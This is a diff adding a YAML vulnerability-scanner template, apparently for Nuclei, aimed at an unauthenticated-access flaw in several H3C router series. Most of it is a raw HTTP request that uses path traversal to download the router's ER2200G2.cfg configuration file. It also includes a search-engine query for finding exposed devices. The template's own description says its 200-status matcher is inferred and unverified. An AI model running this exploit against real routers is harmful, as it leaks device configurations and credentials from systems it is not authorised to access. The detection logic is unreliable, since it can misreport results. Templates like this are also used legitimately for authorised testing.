@@ -1,0 +1,29 @@
+id: poc-xx7w8r51tzzfe3z8
+info:
+  name: H3C多系列路由器存在任意用户登录漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xx7w8r51tzzfe3z8
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xx7w8r51tzzfe3z8
+    fofa: + hunter`app.name="H3C Router Management"`
+http:
+- raw:
+  - 'GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1
+
+    User-Agent: Java/1.8.0_381
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
